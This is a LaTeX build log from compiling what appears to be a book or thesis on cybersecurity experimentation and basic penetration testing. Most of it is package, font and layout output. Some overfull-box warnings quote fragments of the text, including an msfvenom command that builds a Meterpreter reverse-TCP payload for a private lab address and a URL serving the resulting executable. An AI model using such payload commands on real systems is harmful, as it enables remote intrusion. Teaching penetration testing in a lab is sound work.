+(/usr/share/texlive/texmf-dist/tex/latex/caption/caption.sty
+Package: caption 2023/08/05 v3.6o Customizing captions (AR)
+
+(/usr/share/texlive/texmf-dist/tex/latex/caption/caption3.sty
+Package: caption3 2023/07/31 v2.4d caption3 kernel (AR)
+\caption@tempdima=\dimen195
+\captionmargin=\dimen196
+\caption@leftmargin=\dimen197
+\caption@rightmargin=\dimen198
+\caption@width=\dimen199
+\caption@indent=\dimen256
+\caption@parindent=\dimen257
+\caption@hangindent=\dimen258
+Package caption Info: Standard document class detected.
+)
+\c@caption@flags=\count347
+\c@continuedfloat=\count348
+Package caption Info: float package is loaded.
+Package caption Info: hyperref package is loaded.
+Package caption Info: longtable package is loaded.
+
+(/usr/share/texlive/texmf-dist/tex/latex/caption/ltcaption.sty
+Package: ltcaption 2021/01/08 v1.4c longtable captions (AR)
+)
+Package caption Info: rotating package is loaded.
+Package caption Info: supertabular package is loaded.
+)
+(/usr/share/texlive/texmf-dist/tex/latex/xcolor/xcolor.sty
+Package: xcolor 2023/11/15 v3.01 LaTeX color extensions (UK)
+
+(/usr/share/texlive/texmf-dist/tex/latex/graphics-cfg/color.cfg
+File: color.cfg 2016/01/02 v1.6 sample color configuration
+)
+Package xcolor Info: Driver file: xetex.def on input line 274.
+
+(/usr/share/texlive/texmf-dist/tex/latex/graphics/mathcolor.ltx)
+Package xcolor Info: Model `cmy' substituted by `cmy0' on input line 1350.
+Package xcolor Info: Model `RGB' extended on input line 1366.
+Package xcolor Info: Model `HTML' substituted by `rgb' on input line 1368.
+Package xcolor Info: Model `Hsb' substituted by `hsb' on input line 1369.
+Package xcolor Info: Model `tHsb' substituted by `hsb' on input line 1370.
+Package xcolor Info: Model `HSB' substituted by `hsb' on input line 1371.
+Package xcolor Info: Model `Gray' substituted by `gray' on input line 1372.
+Package xcolor Info: Model `wave' substituted by `hsb' on input line 1373.
+)
+(/usr/share/texlive/texmf-dist/tex/latex/listings/listings.sty
+\lst@mode=\count349
+\lst@gtempboxa=\box113
+\lst@token=\toks42
+\lst@length=\count350
+\lst@currlwidth=\dimen259
+\lst@column=\count351
+\lst@pos=\count352
+\lst@lostspace=\dimen260
+\lst@width=\dimen261
+\lst@newlines=\count353
+\lst@lineno=\count354
+\lst@maxwidth=\dimen262
+
+(/usr/share/texlive/texmf-dist/tex/latex/listings/lstmisc.sty
+File: lstmisc.sty 2023/02/27 1.9 (Carsten Heinz)
+\c@lstnumber=\count355
+\lst@skipnumbers=\count356
+\lst@framebox=\box114
+)
+(/usr/share/texlive/texmf-dist/tex/latex/listings/listings.cfg
+File: listings.cfg 2023/02/27 1.9 listings configuration
+))
+Package: listings 2023/02/27 1.9 (Carsten Heinz)
+
+(/usr/share/texlive/texmf-dist/tex/latex/booktabs/booktabs.sty
+Package: booktabs 2020/01/12 v1.61803398 Publication quality tables
+\heavyrulewidth=\dimen263
+\lightrulewidth=\dimen264
+\cmidrulewidth=\dimen265
+\belowrulesep=\dimen266
+\belowbottomsep=\dimen267
+\aboverulesep=\dimen268
+\abovetopsep=\dimen269
+\cmidrulesep=\dimen270
+\cmidrulekern=\dimen271
+\defaultaddspace=\dimen272
+\@cmidla=\count357
+\@cmidlb=\count358
+\@aboverulesep=\dimen273
+\@belowrulesep=\dimen274
+\@thisruleclass=\count359
+\@lastruleclass=\count360
+\@thisrulewidth=\dimen275
+)
+(/usr/share/texlive/texmf-dist/tex/latex/tools/array.sty
+Package: array 2023/10/16 v2.5g Tabular extension package (FMi)
+\col@sep=\dimen276
+\ar@mcellbox=\box115
+\extrarowheight=\dimen277
+\NC@list=\toks43
+\extratabsurround=\skip83
+\backup@length=\skip84
+\ar@cellbox=\box116
+)
+(/usr/share/texlive/texmf-dist/tex/latex/makecell/makecell.sty
+Package: makecell 2009/08/03 V0.1e Managing of Tab Column Heads and Cells
+\rotheadsize=\dimen278
+\c@nlinenum=\count361
+\TeXr@lab=\toks44
+) (./ut_test.aux
+
+LaTeX Warning: Label `sec:persdatabreach' multiply defined.
+
+
+LaTeX Warning: Label `fig:screenshot-montecarlo-persdatabreach-count-discrete' 
+multiply defined.
+
+
+LaTeX Warning: Label `tab:discrete_persdatabreach_montecarlo' multiply defined.
+
+
+
+LaTeX Warning: Label `sec:phishing' multiply defined.
+
+
+LaTeX Warning: Label `fig:screenshot-montecarlo-phishing-count-discrete' multip
+ly defined.
+
+
+LaTeX Warning: Label `tab:discrete_phishing_montecarlo' multiply defined.
+
+
+LaTeX Warning: Label `sec:ransomware' multiply defined.
+
+
+LaTeX Warning: Label `fig:screenshot-montecarlo-ransomware-count-histo' multipl
+y defined.
+
+
+LaTeX Warning: Label `fig:screenshot-montecarlo-ransomware-count-percent' multi
+ply defined.
+
+
+LaTeX Warning: Label `sec:extortion' multiply defined.
+
+
+LaTeX Warning: Label `fig:screenshot-montecarlo-extortion-count-discrete' multi
+ply defined.
+
+
+LaTeX Warning: Label `tab:discrete_extortion_montecarlo' multiply defined.
+
+
+LaTeX Warning: Label `sec:ipr' multiply defined.
+
+
+LaTeX Warning: Label `fig:screenshot-montecarlo-ipr-count-binary' multiply defi
+ned.
+
+
+LaTeX Warning: Label `tab:binary_ipr_montecarlo' multiply defined.
+
+
+LaTeX Warning: Label `sec:identitytheft' multiply defined.
+
+
+LaTeX Warning: Label `fig:screenshot-montecarlo-idtheft-count-discrete' multipl
+y defined.
+
+
+LaTeX Warning: Label `tab:discrete_idtheft_montecarlo' multiply defined.
+
+
+LaTeX Warning: Label `sec:bec' multiply defined.
+
+
+LaTeX Warning: Label `fig:screenshot-montecarlo-bec-count-discrete' multiply de
+fined.
+
+
+LaTeX Warning: Label `tab:discrete_bec_montecarlo' multiply defined.
+
+)
+\openout1 = `ut_test.aux'.
+
+LaTeX Font Info:    Checking defaults for OML/cmm/m/it on input line 194.
+LaTeX Font Info:    ... okay on input line 194.
+LaTeX Font Info:    Checking defaults for OMS/cmsy/m/n on input line 194.
+LaTeX Font Info:    ... okay on input line 194.
+LaTeX Font Info:    Checking defaults for OT1/cmr/m/n on input line 194.
+LaTeX Font Info:    ... okay on input line 194.
+LaTeX Font Info:    Checking defaults for T1/cmr/m/n on input line 194.
+LaTeX Font Info:    ... okay on input line 194.
+LaTeX Font Info:    Checking defaults for TS1/cmr/m/n on input line 194.
+LaTeX Font Info:    Trying to load font information for TS1+cmr on input line 1
+94.
+ (/usr/share/texlive/texmf-dist/tex/latex/base/ts1cmr.fd
+File: ts1cmr.fd 2023/04/13 v2.5m Standard LaTeX font definitions
+)
+LaTeX Font Info:    ... okay on input line 194.
+LaTeX Font Info:    Checking defaults for TU/lmr/m/n on input line 194.
+LaTeX Font Info:    ... okay on input line 194.
+LaTeX Font Info:    Checking defaults for OMX/cmex/m/n on input line 194.
+LaTeX Font Info:    ... okay on input line 194.
+LaTeX Font Info:    Checking defaults for U/cmr/m/n on input line 194.
+LaTeX Font Info:    ... okay on input line 194.
+LaTeX Font Info:    Checking defaults for PD1/pdf/m/n on input line 194.
+LaTeX Font Info:    ... okay on input line 194.
+LaTeX Font Info:    Checking defaults for PU/pdf/m/n on input line 194.
+LaTeX Font Info:    ... okay on input line 194.
+
+*geometry* driver: auto-detecting
+*geometry* detected driver: xetex
+*geometry* verbose mode - [ preamble ] result:
+* driver: xetex
+* paper: custom
+* layout: <same size as paper>
+* layoutoffset:(h,v)=(0.0pt,0.0pt)
+* bindingoffset: 8.67204pt
+* modes: twoside 
+* h-part:(L,W,R)=(68.65627pt, 312.92926pt, 43.36243pt)
+* v-part:(T,H,B)=(54.2025pt, 534.79756pt, 61.42993pt)
+* \paperwidth=433.62pt
+* \paperheight=650.43pt
+* \textwidth=312.92926pt
+* \textheight=534.79756pt
+* \oddsidemargin=5.05832pt
+* \evensidemargin=-28.90756pt
+* \topmargin=-48.13498pt
+* \headheight=21.0pt
+* \headsep=18.06749pt
+* \topskip=10.0pt
+* \footskip=25.29494pt
+* \marginparwidth=125.0pt
+* \marginparsep=7.0pt
+* \columnsep=10.0pt
+* \skip\footins=9.0pt plus 4.0pt minus 2.0pt
+* \hoffset=0.0pt
+* \voffset=0.0pt
+* \mag=1000
+* \@twocolumnfalse
+* \@twosidetrue
+* \@mparswitchtrue
+* \@reversemarginfalse
+* (1in=72.27pt=25.4mm, 1cm=28.453pt)
+
+
+Package fontspec Info: Adjusting the maths setup (use [no-math] to avoid
+(fontspec)             this).
+
+\symlegacymaths=\mathgroup4
+LaTeX Font Info:    Overwriting symbol font `legacymaths' in version `bold'
+(Font)                  OT1/cmr/m/n --> OT1/cmr/bx/n on input line 194.
+LaTeX Font Info:    Redeclaring math accent \acute on input line 194.
+LaTeX Font Info:    Redeclaring math accent \grave on input line 194.
+LaTeX Font Info:    Redeclaring math accent \ddot on input line 194.
+LaTeX Font Info:    Redeclaring math accent \tilde on input line 194.
+LaTeX Font Info:    Redeclaring math accent \bar on input line 194.
+LaTeX Font Info:    Redeclaring math accent \breve on input line 194.
+LaTeX Font Info:    Redeclaring math accent \check on input line 194.
+LaTeX Font Info:    Redeclaring math accent \hat on input line 194.
+LaTeX Font Info:    Redeclaring math accent \dot on input line 194.
+LaTeX Font Info:    Redeclaring math accent \mathring on input line 194.
+LaTeX Font Info:    Redeclaring math symbol \Gamma on input line 194.
+LaTeX Font Info:    Redeclaring math symbol \Delta on input line 194.
+LaTeX Font Info:    Redeclaring math symbol \Theta on input line 194.
+LaTeX Font Info:    Redeclaring math symbol \Lambda on input line 194.
+LaTeX Font Info:    Redeclaring math symbol \Xi on input line 194.
+LaTeX Font Info:    Redeclaring math symbol \Pi on input line 194.
+LaTeX Font Info:    Redeclaring math symbol \Sigma on input line 194.
+LaTeX Font Info:    Redeclaring math symbol \Upsilon on input line 194.
+LaTeX Font Info:    Redeclaring math symbol \Phi on input line 194.
+LaTeX Font Info:    Redeclaring math symbol \Psi on input line 194.
+LaTeX Font Info:    Redeclaring math symbol \Omega on input line 194.
+LaTeX Font Info:    Redeclaring math symbol \mathdollar on input line 194.
+LaTeX Font Info:    Redeclaring symbol font `operators' on input line 194.
+LaTeX Font Info:    Encoding `OT1' has changed to `TU' for symbol font
+(Font)              `operators' in the math version `normal' on input line 194.
+
+LaTeX Font Info:    Overwriting symbol font `operators' in version `normal'
+(Font)                  OT1/cmr/m/n --> TU/LiberationSerif(0)/m/n on input line
+ 194.
+LaTeX Font Info:    Encoding `OT1' has changed to `TU' for symbol font
+(Font)              `operators' in the math version `bold' on input line 194.
+LaTeX Font Info:    Overwriting symbol font `operators' in version `bold'
+(Font)                  OT1/cmr/bx/n --> TU/LiberationSerif(0)/m/n on input lin
+e 194.
+LaTeX Font Info:    Overwriting symbol font `operators' in version `normal'
+(Font)                  TU/LiberationSerif(0)/m/n --> TU/LiberationSerif(0)/m/n
+ on input line 194.
+LaTeX Font Info:    Overwriting math alphabet `\mathit' in version `normal'
+(Font)                  OT1/cmr/m/it --> TU/LiberationSerif(0)/m/it on input li
+ne 194.
+LaTeX Font Info:    Overwriting math alphabet `\mathbf' in version `normal'
+(Font)                  OT1/cmr/bx/n --> TU/LiberationSerif(0)/b/n on input lin
+e 194.
+LaTeX Font Info:    Overwriting math alphabet `\mathsf' in version `normal'
+(Font)                  OT1/cmss/m/n --> TU/lmss/m/n on input line 194.
+LaTeX Font Info:    Overwriting math alphabet `\mathtt' in version `normal'
+(Font)                  OT1/cmtt/m/n --> TU/LiberationMono(0)/m/n on input line
+ 194.
+LaTeX Font Info:    Overwriting symbol font `operators' in version `bold'
+(Font)                  TU/LiberationSerif(0)/m/n --> TU/LiberationSerif(0)/b/n
+ on input line 194.
+LaTeX Font Info:    Overwriting math alphabet `\mathit' in version `bold'
+(Font)                  OT1/cmr/bx/it --> TU/LiberationSerif(0)/b/it on input l
+ine 194.
+LaTeX Font Info:    Overwriting math alphabet `\mathsf' in version `bold'
+(Font)                  OT1/cmss/bx/n --> TU/lmss/b/n on input line 194.
+LaTeX Font Info:    Overwriting math alphabet `\mathtt' in version `bold'
+(Font)                  OT1/cmtt/m/n --> TU/LiberationMono(0)/b/n on input line
+ 194.
+LaTeX Info: Redefining \microtypecontext on input line 194.
+Package microtype Info: Applying patch `item' on input line 194.
+Package microtype Info: Applying patch `toc' on input line 194.
+Package microtype Info: Applying patch `eqnum' on input line 194.
+Package microtype Info: Applying patch `footnote' on input line 194.
+Package microtype Info: Applying patch `verbatim' on input line 194.
+Package microtype Info: Character protrusion enabled (level 2).
+Package microtype Info: Using default protrusion set `alltext'.
+Package microtype Info: No adjustment of tracking.
+Package microtype Info: No adjustment of spacing.
+Package microtype Info: No adjustment of kerning.
+Package microtype Info: Loading generic protrusion settings for font family
+(microtype)             `LiberationSerif' (encoding: TU).
+(microtype)             For optimal results, create family-specific settings.
+(microtype)             See the microtype manual for details.
+Package hyperref Info: Link coloring ON on input line 194.
+(./ut_test.out) (./ut_test.out)
+\@outlinefile=\write7
+\openout7 = `ut_test.out'.
+
+Package caption Info: Begin \AtBeginDocument code.
+Package caption Info: listings package is loaded.
+Package caption Info: End \AtBeginDocument code.
+\c@lstlisting=\count362
+\openout4 = `ut_test.ent'.
+
+ [1
+
+\openout5 = `ut_test.ist'.
+
+
+] [2
+
+]
+Package microtype Info: Loading generic protrusion settings for font family
+(microtype)             `LiberationSans' (encoding: TU).
+(microtype)             For optimal results, create family-specific settings.
+(microtype)             See the microtype manual for details.
+
+(/usr/share/texlive/texmf-dist/tex/latex/microtype/mt-cmr.cfg
+File: mt-cmr.cfg 2013/05/19 v2.2 microtype config. file: Computer Modern Roman 
+(RS)
+) [1
+
+] [2
+
+]
+(./chapters/dedication.tex [1]) [2
+
+] (./ut_test.toc [3] [4]
+Overfull \hbox (5.29866pt too wide) in paragraph at lines 135--135
+ [][] [][][]\TU/LiberationSerif(0)/m/n/10 Intellectual Property Rights ([]Intel
+lectual Property Rights 
+ []
+
+[5] [6])
+\tf@toc=\write8
+\openout8 = `ut_test.toc'.
+
+ (./chapters/author.tex [7] [8
+
+]) [9] [10
+
+]
+(./chapters/acknowledgements.tex [11] [12
+
+]
+Overfull \hbox (0.37558pt too wide) in paragraph at lines 14--15
+\TU/LiberationSerif(0)/m/n/10 “Helvetica” by Gary Hustwit (2007). We carried th
+at through here. InfoOTDisp-
+ []
+
+\openout4 = `ut_test.ent'.
+
+
+Underfull \vbox (badness 10000) has occurred while \output is active []
+
+ [13])
+[14] [15
+
+] [16
+
+] (./chapters/anecdotes_journey.tex
+Chapter 1.
+[1
+
+]
+Underfull \vbox (badness 10000) has occurred while \output is active []
+
+ [2]
+Underfull \vbox (badness 10000) has occurred while \output is active []
+
+ [3]
+Underfull \vbox (badness 10000) has occurred while \output is active []
+
+ [4]
+Underfull \vbox (badness 10000) has occurred while \output is active []
+
+ [5]
+Underfull \vbox (badness 10000) has occurred while \output is active []
+
+ [6]
+[7]
+Underfull \vbox (badness 10000) has occurred while \output is active []
+
+ [8]
+Underfull \vbox (badness 10000) has occurred while \output is active []
+
+ [9]
+[10]
+Underfull \vbox (badness 10000) has occurred while \output is active []
+
+ [11]
+Underfull \vbox (badness 10000) has occurred while \output is active []
+
+ [12]
+Underfull \vbox (badness 10000) has occurred while \output is active []
+
+ [13]
+[14]) (./chapters/towards_experimentation.tex [15] [16
+
+]
+Chapter 2.
+
+Underfull \vbox (badness 10000) has occurred while \output is active []
+
+ [17]
+Underfull \vbox (badness 10000) has occurred while \output is active []
+
+ [18]
+[19]
+Overfull \hbox (11.95903pt too wide) in paragraph at lines 41--42
+\TU/LiberationSerif(0)/m/n/10 ideas can be readily applied to evaluating cybers
+ecurity threats [21] [22]. Shadish’s
+ []
+
+
+Overfull \hbox (1.8044pt too wide) in paragraph at lines 41--42
+[]\TU/LiberationSerif(0)/m/n/10 experimental design guidance to larger situatio
+ns involving policy changes. [25] 
+ []
+
+
+Underfull \vbox (badness 10000) has occurred while \output is active []
+
+ [20]
+Underfull \vbox (badness 10000) has occurred while \output is active []
+
+ [21]
+Underfull \vbox (badness 10000) has occurred while \output is active []
+
+ [22]
+Underfull \vbox (badness 10000) has occurred while \output is active []
+
+ [23]
+Underfull \vbox (badness 10000) has occurred while \output is active []
+
+ [24]
+Underfull \vbox (badness 10000) has occurred while \output is active []
+
+ [25]
+[26]
+Underfull \vbox (badness 10000) has occurred while \output is active []
+
+ [27]
+Underfull \vbox (badness 10000) has occurred while \output is active []
+
+ [28]
+[29]
+Underfull \vbox (badness 10000) has occurred while \output is active []
+
+ [30]
+[31]
+File: images/WeidmanCH4PresentationB2.jpg Graphic file (type bmp)
+<images/WeidmanCH4PresentationB2.jpg>
+File: images/WeidmanCH4PresentationB1.jpg Graphic file (type bmp)
+<images/WeidmanCH4PresentationB1.jpg>
+
+
+LaTeX Warning: `!h' float specifier changed to `!ht'.
+
+File: images/WeidmanCH4PresentationB3.jpg Graphic file (type bmp)
+<images/WeidmanCH4PresentationB3.jpg>
+
+LaTeX Warning: `!h' float specifier changed to `!ht'.
+
+File: images/WeidmanCH4PresentationB4.jpg Graphic file (type bmp)
+<images/WeidmanCH4PresentationB4.jpg>
+
+LaTeX Warning: `!h' float specifier changed to `!ht'.
+
+[32]
+File: images/WeidmanCH4PresentationB5.jpg Graphic file (type bmp)
+<images/WeidmanCH4PresentationB5.jpg>
+
+
+LaTeX Warning: `!h' float specifier changed to `!ht'.
+
+
+Overfull \hbox (39.99557pt too wide) in paragraph at lines 210--211
+[]\TU/LiberationSerif(0)/m/it/10 msfvenom \TU/LiberationSerif(0)/m/n/10 <target
+ computer specific payload><listening computer address><listening
+ []
+
+File: images/WeidmanCH4PresentationB6.jpg Graphic file (type bmp)
+<images/WeidmanCH4PresentationB6.jpg>
+
+LaTeX Warning: `!h' float specifier changed to `!ht'.
+
+
+Overfull \hbox (42.86177pt too wide) in paragraph at lines 220--221
+[]\TU/LiberationSerif(0)/m/it/10 msfvenom windows/meterpreter/reverse_tcp LHOST
+=192.168.56.101 LPORT=12345
+ []
+
+[33]
+File: images/WeidmanCH4PresentationB7.jpg Graphic file (type bmp)
+<images/WeidmanCH4PresentationB7.jpg>
+
+
+LaTeX Warning: `!h' float specifier changed to `!ht'.
+
+File: images/WeidmanCH4PresentationB8.jpg Graphic file (type bmp)
+<images/WeidmanCH4PresentationB8.jpg>
+
+LaTeX Warning: `!h' float specifier changed to `!ht'.
+
+File: images/WeidmanCH4PresentationB9.jpg Graphic file (type bmp)
+<images/WeidmanCH4PresentationB9.jpg>
+
+LaTeX Warning: `!h' float specifier changed to `!ht'.
+
+[34]
+File: images/WeidmanCH4PresentationB10.jpg Graphic file (type bmp)
+<images/WeidmanCH4PresentationB10.jpg>
+
+
+LaTeX Warning: `!h' float specifier changed to `!ht'.
+
+
+Overfull \hbox (43.8451pt too wide) in paragraph at lines 268--269
+\TU/LiberationSerif(0)/m/n/10 rectory that holds the file with the []exploit in
+ it. http://192.168.56.101/chapter4example.exe.
+ []
+
+File: images/WeidmanCH4PresentationB11.jpg Graphic file (type bmp)
+<images/WeidmanCH4PresentationB11.jpg>
+
+LaTeX Warning: `!h' float specifier changed to `!ht'.
+
+[35] [36] [37] [38] [39]
+Underfull \vbox (badness 10000) has occurred while \output is active []
+
+ [40
+
+]
+Underfull \vbox (badness 10000) has occurred while \output is active []
+
+ [41]
+Underfull \vbox (badness 10000) has occurred while \output is active []
+
+ [42]
+Overfull \hbox (12.02629pt too wide) in paragraph at lines 324--325
+\TU/LiberationSerif(0)/m/n/10 Lee Bortherston and Amanda Berlin. The Defensive 
+Security Handbook. O’Reilly,
+ []
+
+[43]
+Underfull \vbox (badness 10000) has occurred while \output is active []
+
+ [44]
+LaTeX Font Info:    Font shape `TU/LiberationMono(0)/m/n' will be
+(Font)              scaled to size 10.0pt on input line 352.
+Package microtype Info: Loading generic protrusion settings for font family
+(microtype)             `LiberationMono' (encoding: TU).
+(microtype)             For optimal results, create family-specific settings.
+(microtype)             See the microtype manual for details.
+
+Overfull \hbox (1.76797pt too wide) in paragraph at lines 352--352
+[]\TU/LiberationSerif(0)/m/n/10 OAT-002 Token Cracking Mass enumeration of coup
+on numbers, voucher
+ []
+
+
+Underfull \vbox (badness 10000) has occurred while \output is active []
+
+ [45]
+Overfull \hbox (12.85507pt too wide) in paragraph at lines 369--370
+\TU/LiberationSerif(0)/m/n/10 160. Winter 2016, Volume 70, Number 1. JIA.SIPA.C
+OLUMBIA.EDU. Columbia
+ []
+
+[46]
+Overfull \hbox (12.85507pt too wide) in paragraph at lines 379--379
+\TU/LiberationSerif(0)/m/n/10 138. Winter 2016, Volume 70, Number 1. JIA.SIPA.C
+OLUMBIA.EDU. Columbia
+ []
+
+
+Overfull \hbox (17.01501pt too wide) in paragraph at lines 381--382
+[]\TU/LiberationSerif(0)/m/n/10 Sedlock, Alicia. ”An Introduction to Frontend T
+esting,” The Ultimate Javascript
+ []
+
+
+Overfull \hbox (35.004pt too wide) in paragraph at lines 388--389
+[]\TU/LiberationSerif(0)/m/n/10 _____. SCRT Information Security, ”https://www.
+scrt.ch/en/[]attack/downloads/mini-
+ []
+
+
+Overfull \hbox (50.0852pt too wide) in paragraph at lines 390--391
+[]\TU/LiberationSerif(0)/m/n/10 _____. SCRT Information Security, ”https://www.
+scrt.ch/outils/mms/mms_manual.pdf”
+ []
+
+
+Overfull \hbox (185.64888pt too wide) in paragraph at lines 392--393
+[]\TU/LiberationSerif(0)/m/n/10 Fresnillo, Rodolfo Resendez. YouTube, ”MiniMysq
+lator & Pblind”, ”https://www.youtube.com/watch?v=uK3_qR3Kn_g”
+ []
+
+[47]
+Overfull \hbox (41.89868pt too wide) in paragraph at lines 394--395
+[]\TU/LiberationSerif(0)/m/n/10 _____. ”https://www.nist.gov/news-events/events
+/2017/03/cybersecurity-framework-
+ []
+
+
+Overfull \hbox (4.28288pt too wide) in paragraph at lines 396--397
+[]\TU/LiberationSerif(0)/m/n/10 _____. ”https://owasp.org/index.php/Top_10_2013
+-Top_10” OWASP, 2017.
+ []
+
+
+Overfull \hbox (2.14975pt too wide) in paragraph at lines 420--421
+[]\TU/LiberationSerif(0)/m/n/10 _____. Microsoft Azure, ”https://azure.microsof
+t.com/en-us/?cdn=disable”.
+ []
+
+
+Overfull \hbox (53.92018pt too wide) in paragraph at lines 424--425
+\TU/LiberationSerif(0)/m/n/10 jectory for profound change’,”Medium. http://sear
+chsecurity.techtarget.com/opinion/Wendy-
+ []
+
+
+Overfull \hbox (32.04822pt too wide) in paragraph at lines 426--427
+\TU/LiberationSerif(0)/m/n/10 Marcus Ranum. ”Wendy Nather: ’We’re on a trajecto
+ry for profound change’,”Medium.
+ []
+
+
+Overfull \hbox (12.0609pt too wide) in paragraph at lines 426--427
+\TU/LiberationSerif(0)/m/n/10 http://searchsecurity.techtarget.com/opinion/Wend
+y-Nather-Were-on-a-trajectory-
+ []
+
+
+Overfull \hbox (161.51743pt too wide) in paragraph at lines 428--429
+[]\TU/LiberationSerif(0)/m/n/10 Shadish, William. CV, University of California 
+Merced. INTERNET: http://faculty.ucmerced.edu/wshadish/shadish-
+ []
+
+
+Overfull \hbox (17.92525pt too wide) in paragraph at lines 430--431
+\TU/LiberationSerif(0)/m/n/10 summer-workshops/quasi-experimental-design-and-an
+alysis/ This workshop shows
+ []
+
+
+Underfull \vbox (badness 10000) has occurred while \output is active []
+
+ [48]
+Overfull \hbox (14.1141pt too wide) in paragraph at lines 436--437
+[]\TU/LiberationSerif(0)/m/n/10 Raspberry Pi []OS Download: https://www.raspber
+rypi.org/downloads/raspbian/ 
+ []
+
+
+Overfull \hbox (50.08179pt too wide) in paragraph at lines 440--441
+[]\TU/LiberationSerif(0)/m/n/10 Powershell to get the []hash of a download on W
+indows 10: https://docs.microsoft.com/en-
+ []
+
+
+Overfull \hbox (14.29723pt too wide) in paragraph at lines 440--441
+\TU/LiberationSerif(0)/m/n/10 us/powershell/module/microsoft.powershell.utility
+/get-filehash?view=powershell-
+ []
+
+
+Overfull \hbox (25.8977pt too wide) in paragraph at lines 442--443
+[]\TU/LiberationSerif(0)/m/n/10 _____. https://unix.stackexchange.com/questions
+/151547/linux-set-date-through-
+ []
+
+
+Overfull \hbox (25.38176pt too wide) in paragraph at lines 444--445
+[]\TU/LiberationSerif(0)/m/n/10 _____. INTERNET: https://[]motherboard.vice.com
+/en_us/article/vv7zn9/surprise-
+ []
+
+
+Overfull \hbox (42.14941pt too wide) in paragraph at lines 448--449
+[]\TU/LiberationSerif(0)/m/n/10 _____. INTERNET: https://www.aircrack-ng.org/do
+ku.php?id=compatibility_drivers 
+ []
+
+
+Overfull \hbox (4.59082pt too wide) in paragraph at lines 452--453
+[]\TU/LiberationSerif(0)/m/n/10 _____. INTERNET: https://wikidevi.com/wiki/TP-L
+INK_TL-WN722N_v2 
+ []
+
+
+Overfull \hbox (19.72754pt too wide) in paragraph at lines 454--455
+[]\TU/LiberationSerif(0)/m/n/10 _____. INTERNET: https://wikidevi.com/wiki/ALFA
+_Network_AWUS036NH 
+ []
+
+
+Overfull \hbox (40.66985pt too wide) in paragraph at lines 464--465
+[]\TU/LiberationSerif(0)/m/n/10 _____. INTERNET: https://www.raspberrypi.org/do
+cumentation/[]configuration/raspi-
+ []
+
+
+Overfull \hbox (0.86516pt too wide) in paragraph at lines 466--467
+[]\TU/LiberationSerif(0)/m/n/10 _____. INTERNET: https://www.walmart.com/ip/TP-
+LINK-TL-WN722N-
+ []
+
+
+Overfull \hbox (7.4716pt too wide) in paragraph at lines 468--469
+[]\TU/LiberationSerif(0)/m/n/10 _____. INTERNET: https://www.amazon.com/Alfa-AW
+US036NH-802-11g-
+ []
+
+
+Overfull \hbox (11.31926pt too wide) in paragraph at lines 470--471
+[]\TU/LiberationSerif(0)/m/n/10 _____. INTERNET: https://www.amazon.com/Alfa-AW
+USO36NH-Wireless-
+ []
+
+
+Overfull \hbox (3.09172pt too wide) in paragraph at lines 472--473
+[]\TU/LiberationSerif(0)/m/n/10 _____. INTERNET: https://www.csoonline.com/arti
+cle/2462478/microsoft-
+ []
+
+
+Overfull \hbox (252.63275pt too wide) in paragraph at lines 476--477
+[]\TU/LiberationSerif(0)/m/n/10 Reddit Owned : _____. INTERNET: https://www.red
+dit.com/r/Defcon/comments/2d16lk/your_pineapple_has_been_owned_son/#bottom-
+ []
+
+
+Underfull \vbox (badness 10000) has occurred while \output is active []
+
+ [49]
+Overfull \hbox (14.37265pt too wide) in paragraph at lines 480--481
+[]\TU/LiberationSerif(0)/m/n/10 _____. INTERNET: https://capec.mitre.org/data/d
+efinitions/1000.html ”Mech-
+ []
+
+
+Overfull \hbox (17.17546pt too wide) in paragraph at lines 486--487
+[]\TU/LiberationSerif(0)/m/n/10 _____. INTERNET: https://capec.mitre.org/data/d
+efinitions/513.html ”CAPEC
+ []
+
+
+Overfull \hbox (6.05234pt too wide) in paragraph at lines 488--489
+[]\TU/LiberationSerif(0)/m/n/10 _____. INTERNET: https://capec.mitre.org/data/d
+efinitions/248.html ”Com-
+ []
+
+
+Overfull \hbox (6.05234pt too wide) in paragraph at lines 492--493
+[]\TU/LiberationSerif(0)/m/n/10 _____. INTERNET: https://capec.mitre.org/data/d
+efinitions/108.html ”Com-
+ []
+
+
+Overfull \hbox (11.43417pt too wide) in paragraph at lines 494--495
+[]\TU/LiberationSerif(0)/m/n/10 _____. INTERNET: http://cwe.mitre.org/data/defi
+nitions/707.html ”Improper
+ []
+
+
+Overfull \hbox (2.16081pt too wide) in paragraph at lines 498--499
+[]\TU/LiberationSerif(0)/m/n/10 _____. INTERNET: http://capec.mitre.org/data/de
+finitions/242.html ”Code
+ []
+
+
+Overfull \hbox (5.70085pt too wide) in paragraph at lines 500--501
+[]\TU/LiberationSerif(0)/m/n/10 _____. INTERNET: https://capec.mitre.org/data/d
+efinitions/110.html SOAP
+ []
+
+
+Overfull \hbox (1.05699pt too wide) in paragraph at lines 507--508
+\TU/LiberationSerif(0)/m/n/10 _____. ”Framework for Improving Ciritcal Infrastr
+ucture Cybersecurity.” []NIST,
+ []
+
+
+Overfull \hbox (11.55396pt too wide) in paragraph at lines 511--512
+[]\TU/LiberationSerif(0)/m/n/10 _____. B-Sides Charleston, 11-12NOV2016. Securi
+ty conference, Charleston,
+ []
+
+
+Overfull \hbox (20.39099pt too wide) in paragraph at lines 513--514
+[]\TU/LiberationSerif(0)/m/n/10 Gillam, Jason. ”Web Penetration and Testing,” B
+-Sides Charleston, 11NOV2016.
+ []
+
+[50]
+Overfull \hbox (10.9023pt too wide) in paragraph at lines 517--518
+\TU/LiberationSerif(0)/m/n/10 ing the specialized terminology (e.g. randomized 
+experiments, quasi-experiments)
+ []
+
+
+Overfull \hbox (2.56207pt too wide) in paragraph at lines 521--522
+[]\TU/LiberationSerif(0)/m/n/10 Shadish, William, Ibidem., p. 4: ”A lighted mat
+ch is, therefore, what Mackie
+ []
+
+
+Underfull \vbox (badness 10000) has occurred while \output is active []
+
+ [51]
+Underfull \vbox (badness 10000) has occurred while \output is active []
+
+ [52]
+Overfull \hbox (1.23868pt too wide) in paragraph at lines 577--578
+[]\TU/LiberationSerif(0)/m/n/10 Shadish, William, Ibidem.,p.19: ”Experiments th
+at demonstrate limited gen-
+ []
+
+
+Underfull \vbox (badness 10000) has occurred while \output is active []
+
+ [53]
+Overfull \hbox (5.70523pt too wide) in paragraph at lines 607--608
+\TU/LiberationSerif(0)/m/n/10 the International Criminal Court and gives it jur
+isdiction over individuals charged
+ []
+
+
+Underfull \vbox (badness 10000) has occurred while \output is active []
+
+ [54]
+Underfull \vbox (badness 10000) has occurred while \output is active []
+
+ [55]
+Underfull \vbox (badness 10000) has occurred while \output is active []
+
+ [56])
+(./chapters/basic_pentesting.tex [57] [58
+
+]
+Chapter 3.
+
+Package hyperref Warning: Difference (2) between bookmark levels is greater 
